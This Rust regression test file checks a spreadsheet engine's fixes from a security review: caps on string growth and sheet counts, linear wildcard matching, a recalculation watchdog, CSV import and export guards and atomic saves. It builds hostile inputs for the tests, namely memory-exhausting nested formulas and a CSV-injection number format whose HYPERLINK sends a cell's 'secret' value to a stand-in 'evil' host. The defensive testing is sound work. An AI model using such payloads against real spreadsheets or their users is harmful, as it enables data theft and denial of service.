//! Regression tests for the 2026-10-19 security review
//! (`docs/reviews/security-review-2026-10-19.md`), engine side: H2, H3, M1,
//! M2, M3, M7 and L9. Malicious inputs are generated in the tests.
#![allow(clippy::unwrap_used)]

mod common;

use std::time::{Duration, Instant};

use common::Fixture;
use tally_api::{DocumentService, Op};
use tally_engine::recalc::{hard_recalc_with, RecalcBudget};
use tally_engine::Workbook;
use tally_model::{CellContentData, CellData, SheetData, WorkbookData};
use tally_types::{ErrorKind, Value};

/// `=SUBSTITUTE(…SUBSTITUTE("a";"a";"aaaaaaaaaa")…)` nested `n` deep:
/// 10^n characters.
fn nested_substitute(n: usize) -> String {
    let mut f = String::from("\"a\"");
    for _ in 0..n {
        f = format!("SUBSTITUTE({f},\"a\",\"aaaaaaaaaa\")");
    }
    f
}

/// M1: nine nested SUBSTITUTEs would build 10^9 characters (2.2 GB RSS
/// before the fix). Each level's result passes through the 4 MiB cap, so
/// growth stops at the first result over it (10^7 characters) with Err:513.
#[test]
fn nested_substitute_hits_string_cap() {
    let mut f = Fixture::new();
    let t = Instant::now();
    f.set("A1", &format!("=LEN({})", nested_substitute(9)));
    let took = t.elapsed();
    assert_eq!(f.value("A1"), Value::Error(ErrorKind::StringOverflow));
    assert!(took < Duration::from_secs(1), "took {took:?}");
    // Under the cap, text functions still work.
    f.set("A2", &format!("=LEN({})", nested_substitute(6)));
    assert_eq!(f.value("A2"), Value::Number(1e6));
}

/// M1: SUBSTITUTE sizes its result before building it, so a huge
/// replacement fails without allocating.
#[test]
fn substitute_checks_size_before_allocating() {
    let mut f = Fixture::new();
    f.set("A1", &format!("={}", nested_substitute(6)));
    let t = Instant::now();
    // 10^6 matches × 10^6-byte replacement = 10^12 bytes if built.
    f.set("A2", "=LEN(SUBSTITUTE(A1,\"a\",A1))");
    assert_eq!(f.value("A2"), Value::Error(ErrorKind::StringOverflow));
    assert!(t.elapsed() < Duration::from_secs(1), "{:?}", t.elapsed());
}

/// M1: the `&` operator and CONCATENATE are capped too (a chain of
/// `A2=A1&A1` doubled per cell before).
#[test]
fn concat_hits_string_cap() {
    let mut f = Fixture::new();
    f.set("A1", &format!("={}", nested_substitute(6))); // 1,000,000 bytes
    f.set("A2", "=A1&A1"); // 2,000,000
    f.set("A3", "=A2&A2"); // 4,000,000 (< 4 MiB)
    f.set("A4", "=A3&A3"); // 8,000,000
    f.set("A5", "=LEN(A4)");
    f.set("A6", "=CONCATENATE(A3,A3)");
    assert_eq!(f.value("A5"), Value::Error(ErrorKind::StringOverflow));
    assert!(matches!(f.value("A3"), Value::Text(t) if t.len() == 4_000_000));
    assert_eq!(f.value("A4"), Value::Error(ErrorKind::StringOverflow));
    assert_eq!(f.value("A6"), Value::Error(ErrorKind::StringOverflow));
}

/// M2: a 4,000-character wildcard pattern against 1 MB of text (3.2 s per
/// cell with the backtracking matcher) is linear with the compiled regex.
#[test]
fn wildcard_countif_is_linear() {
    let mut f = Fixture::new();
    f.set("A1", &format!("={}", nested_substitute(6)));
    let pattern = format!("*{}b", "a".repeat(4000));
    let t = Instant::now();
    f.set("B1", &format!("=COUNTIF(A1,\"{pattern}\")"));
    let took = t.elapsed();
    assert_eq!(f.value("B1"), Value::Number(0.0));
    // Unoptimised (debug) builds run the regex crate several times slower.
    let budget = if cfg!(debug_assertions) {
        Duration::from_millis(1000)
    } else {
        Duration::from_millis(100)
    };
    assert!(took < budget, "took {took:?}");
    f.set("B2", &format!("=COUNTIF(A1,\"*{}\")", "a".repeat(4000)));
    assert_eq!(f.value("B2"), Value::Number(1.0));
}

fn sheet(name: &str) -> SheetData {
    SheetData {
        name: name.into(),
        ..SheetData::default()
    }
}

/// H2: 2,000 sheets with the same name load in linear time (43 s before).
#[test]
fn same_named_sheets_load_fast() {
    let data = WorkbookData {
        sheets: (0..2000).map(|_| sheet("A")).collect(),
        ..WorkbookData::default()
    };
    let t = Instant::now();
    let wb = Workbook::from_data(&data);
    let took = t.elapsed();
    assert!(took < Duration::from_secs(1), "took {took:?}");
    assert_eq!(wb.sheets.len(), 2000);
    assert_eq!(&*wb.sheets[0].name, "A");
    assert_eq!(&*wb.sheets[1].name, "A_2");
    assert_eq!(&*wb.sheets[1999].name, "A_2000");
    let mut names: Vec<String> = wb.sheets.iter().map(|s| s.name.to_lowercase()).collect();
    names.sort();
    names.dedup();
    assert_eq!(names.len(), 2000);
}

/// H2: the engine caps sheets at 10,000 (loading and adding).
#[test]
fn sheet_count_is_capped() {
    let data = WorkbookData {
        sheets: (0..10_001).map(|_| sheet("")).collect(),
        ..WorkbookData::default()
    };
    let wb = Workbook::from_data(&data);
    assert_eq!(wb.sheets.len(), tally_engine::workbook::MAX_SHEETS);
    let mut svc = tally_engine::EngineService::new();
    let info = svc.open_workbook(wb, "big");
    let res = svc.apply(
        info.doc,
        common::tx(vec![Op::AddSheet {
            name: None,
            index: None,
        }]),
    );
    let res = res.unwrap();
    assert_eq!(res.errors.len(), 1, "{:?}", res.errors);
    assert!(res.errors[0].message.contains("at most"));
}

/// M3: the recalc watchdog stops after its formula budget; skipped
/// formulas keep the values cached in the file and recalculate when
/// their inputs change.
#[test]
fn recalc_budget_stops_and_keeps_cached_values() {
    let mut cells = vec![CellData {
        row: 0,
        col: 0,
        content: CellContentData::Value(Value::Number(1.0)),
        style: None,
    }];
    for r in 1..=100 {
        cells.push(CellData {
            row: r,
            col: 0,
            content: CellContentData::Formula {
                text: "of:=[.A1]*2".into(),
                cached: Some(Value::Number(7.0)),
            },
            style: None,
        });
    }
    let data = WorkbookData {
        sheets: vec![SheetData {
            name: "S".into(),
            cells,
            ..SheetData::default()
        }],
        ..WorkbookData::default()
    };
    let mut wb = Workbook::from_data(&data);
    let rep = hard_recalc_with(&mut wb, &RecalcBudget::within(10, None));
    assert!(rep.incomplete);
    assert_eq!(rep.evaluated, 10);
    assert_eq!(rep.skipped, 90);
    let s = wb.sheets[0].id;
    let v = |wb: &Workbook, r: u32| wb.value(tally_types::CellAddr::new(s, r, 0));
    assert_eq!(v(&wb, 1), Value::Number(2.0));
    assert_eq!(v(&wb, 100), Value::Number(7.0), "cached value kept");
    // Editing the input recalculates every dependent as usual.
    wb.set_input(tally_types::CellAddr::new(s, 0, 0), "5");
    tally_engine::recalc::recalc(&mut wb);
    assert_eq!(v(&wb, 100), Value::Number(10.0));
}

#[cfg(feature = "io")]
mod files {
    use super::*;
    use std::path::PathBuf;
    use tally_api::FileFormat;
    use tally_engine::EngineService;
    use tally_model::StyleData;

    fn temp_dir(tag: &str) -> PathBuf {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        let d = std::env::temp_dir().join(format!(
            "tally-security-{tag}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn write_ods(path: &std::path::Path, data: &WorkbookData) {
        let mut cur = std::io::Cursor::new(Vec::new());
        tally_io_ods::write_ods(data, &mut cur).unwrap();
        std::fs::write(path, cur.into_inner()).unwrap();
    }

    fn value_cell(row: u32, col: u32, v: Value, style: Option<u32>) -> CellData {
        CellData {
            row,
            col,
            content: CellContentData::Value(v),
            style,
        }
    }

    /// H2: an ODS with 2,000 same-named sheets opens in under a second; only
    /// the first *unnamed* sheet takes the file name.
    #[test]
    fn same_named_sheets_open_fast() {
        let dir = temp_dir("sheets");
        let p = dir.join("many.ods");
        let mut sheets: Vec<SheetData> = (0..2000).map(|_| sheet("A")).collect();
        sheets.push(sheet(""));
        sheets.push(sheet(""));
        write_ods(
            &p,
            &WorkbookData {
                sheets,
                ..WorkbookData::default()
            },
        );
        let mut svc = EngineService::with_default_codec();
        let t = Instant::now();
        let info = svc.open(&p).unwrap();
        let took = t.elapsed();
        assert!(took < Duration::from_secs(1), "took {took:?}");
        assert_eq!(info.sheets.len(), 2002);
        assert_eq!(info.sheets[1999].name, "A_2000");
        assert_eq!(info.sheets[2000].name, "many");
        assert_eq!(info.sheets[2001].name, "Sheet2002");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// H3: the review's `csvinj.ods`: a number whose format displays
    /// `=HYPERLINK(…)+5` is guarded in the CSV export; plain negative
    /// numbers are not; currency-looking text is.
    #[test]
    fn csv_export_guards_formatted_numbers() {
        let dir = temp_dir("csvinj");
        let evil = StyleData {
            number_format: Some(r#""=HYPERLINK(""http://evil/?""&A1;""x"")+"0"#.into()),
            ..StyleData::default()
        };
        let data = WorkbookData {
            sheets: vec![SheetData {
                name: "S".into(),
                cells: vec![
                    value_cell(0, 0, Value::text("secret"), None),
                    value_cell(0, 1, Value::Number(5.0), Some(0)),
                    value_cell(0, 2, Value::Number(-5.0), None),
                    value_cell(0, 3, Value::Number(-1234.5), None),
                    value_cell(0, 4, Value::text("-$5.00"), None),
                ],
                ..SheetData::default()
            }],
            styles: vec![evil],
            ..WorkbookData::default()
        };
        let ods = dir.join("csvinj.ods");
        write_ods(&ods, &data);
        let mut svc = EngineService::with_default_codec();
        let info = svc.open(&ods).unwrap();
        let csv = dir.join("csvinj.csv");
        svc.save(info.doc, Some(&csv), FileFormat::Csv).unwrap();
        let text = std::fs::read_to_string(&csv).unwrap();
        let line = text.lines().next().unwrap();
        assert!(
            line.starts_with("secret,'=HYPERLINK(") && line.contains(")+5,"),
            "formatted number guarded: {line}"
        );
        assert!(line.ends_with(",-5,-1234.5,'-$5.00"), "{line}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// M3: a CSV's `=` fields import as text, so opening a CSV never runs
    /// its formulas (the review's `slow.csv` took 3.1 s and 935 MB).
    #[test]
    fn csv_formulas_import_as_text() {
        let dir = temp_dir("csvtext");
        let p = dir.join("slow.csv");
        let body = ",,=SUMPRODUCT(A1:A1048576*B1:B1048576)\n".repeat(200);
        std::fs::write(&p, format!("=1+2,-5,{body}")).unwrap();
        let mut svc = EngineService::with_default_codec();
        let t = Instant::now();
        let info = svc.open(&p).unwrap();
        assert!(t.elapsed() < Duration::from_secs(1), "{:?}", t.elapsed());
        let wb = &svc.document(info.doc).unwrap().wb;
        let s = info.sheets[0].id;
        let at = |r, c| wb.value(tally_types::CellAddr::new(s, r, c));
        assert_eq!(at(0, 0), Value::text("=1+2"));
        assert_eq!(at(0, 1), Value::Number(-5.0));
        assert_eq!(
            at(1, 2),
            Value::text("=SUMPRODUCT(A1:A1048576*B1:B1048576)")
        );
        assert!(wb.formulas.iter().next().is_none(), "no live formulas");
        // The opt-in path still evaluates.
        let data = WorkbookData {
            sheets: vec![SheetData {
                name: "S".into(),
                cells: vec![value_cell(0, 0, Value::text("=1+2"), None)],
                ..SheetData::default()
            }],
            ..WorkbookData::default()
        };
        let mut wb = Workbook::from_data_opts(&data, true, true);
        tally_engine::recalc::recalc(&mut wb);
        let s = wb.sheets[0].id;
        assert_eq!(
            wb.value(tally_types::CellAddr::new(s, 0, 0)),
            Value::Number(3.0)
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// M3: opening a file with heavy formulas stops at the watchdog's
    /// deadline and reports a warning once.
    #[test]
    fn heavy_open_stops_at_deadline_with_warning() {
        let dir = temp_dir("heavy");
        let p = dir.join("heavy.ods");
        let mut cells = vec![
            value_cell(0, 0, Value::Number(1.0), None),
            value_cell(0, 1, Value::Number(2.0), None),
        ];
        for r in 1..=200 {
            cells.push(CellData {
                row: r,
                col: 2,
                content: CellContentData::Formula {
                    text: "of:=SUMPRODUCT([.A1:.A1048576]*[.B1:.B1048576])".into(),
                    cached: Some(Value::Number(2.0)),
                },
                style: None,
            });
        }
        write_ods(
            &p,
            &WorkbookData {
                sheets: vec![SheetData {
                    name: "S".into(),
                    cells,
                    ..SheetData::default()
                }],
                ..WorkbookData::default()
            },
        );
        let mut svc = EngineService::with_default_codec();
        let limit = Duration::from_millis(200);
        svc.set_open_recalc_limits(u64::MAX, Some(limit));
        let t = Instant::now();
        let info = svc.open(&p).unwrap();
        let took = t.elapsed();
        // One formula may finish after the deadline; never all 200.
        assert!(took < limit + Duration::from_secs(3), "took {took:?}");
        assert_eq!(info.warnings.len(), 1, "{:?}", info.warnings);
        assert!(info.warnings[0].starts_with("Recalculation stopped after"));
        let doc = svc.document(info.doc).unwrap();
        assert!(doc.recalc_incomplete);
        // Delivered once.
        assert!(doc.info().warnings.is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// M7: values at A1 and XFD1048576 export sparsely and quickly; an
    /// export that would exceed 10M fields is refused.
    #[test]
    fn csv_export_is_sparse_and_capped() {
        let dir = temp_dir("sparse");
        let corner = WorkbookData {
            sheets: vec![SheetData {
                name: "S".into(),
                cells: vec![
                    value_cell(0, 0, Value::text("first"), None),
                    value_cell(1_048_575, 16_383, Value::text("last"), None),
                ],
                ..SheetData::default()
            }],
            ..WorkbookData::default()
        };
        let mut svc = EngineService::with_default_codec();
        let info = svc.open_workbook(Workbook::from_data(&corner), "corner");
        let csv = dir.join("corner.csv");
        let t = Instant::now();
        svc.save(info.doc, Some(&csv), FileFormat::Csv).unwrap();
        assert!(t.elapsed() < Duration::from_secs(2), "{:?}", t.elapsed());
        let text = std::fs::read_to_string(&csv).unwrap();
        let lines: Vec<&str> = text.split("\r\n").collect();
        assert_eq!(lines.len(), 1_048_577); // trailing terminator
        assert_eq!(lines[0], "first");
        assert_eq!(lines[1], "");
        assert_eq!(lines[1_048_575], format!("{}last", ",".repeat(16_383)));

        // A diagonal over the whole width: 134M fields.
        let diag = WorkbookData {
            sheets: vec![SheetData {
                name: "S".into(),
                cells: (0..16_384)
                    .map(|i| value_cell(i, i, Value::Number(1.0), None))
                    .collect(),
                ..SheetData::default()
            }],
            ..WorkbookData::default()
        };
        let info = svc.open_workbook(Workbook::from_data(&diag), "diag");
        let err = svc
            .save(info.doc, Some(&dir.join("diag.csv")), FileFormat::Csv)
            .unwrap_err();
        assert_eq!(err.code, tally_api::ApiError::UNSUPPORTED);
        assert!(!dir.join("diag.csv").exists());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// L9: saving replaces the target atomically: no temp files remain, and a
    /// symlink at the target is replaced instead of written through.
    #[cfg(unix)]
    #[test]
    fn save_is_atomic_and_does_not_follow_symlinks() {
        let dir = temp_dir("atomic");
        let real = dir.join("real.ods");
        std::fs::write(&real, b"original").unwrap();
        let link = dir.join("link.ods");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let mut svc = EngineService::with_default_codec();
        let info = svc.new_workbook(None).unwrap();
        svc.save(info.doc, Some(&link), FileFormat::Ods).unwrap();
        assert_eq!(std::fs::read(&real).unwrap(), b"original");
        let meta = std::fs::symlink_metadata(&link).unwrap();
        assert!(meta.file_type().is_file(), "symlink replaced by the file");
        assert!(tally_io_ods::sniff_is_ods(&std::fs::read(&link).unwrap()));
        // Save again over the (now regular) file; nothing else is left.
        svc.save(info.doc, None, FileFormat::Ods).unwrap();
        let mut names: Vec<String> = std::fs::read_dir(&dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        assert_eq!(names, ["link.ods", "real.ods"]);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
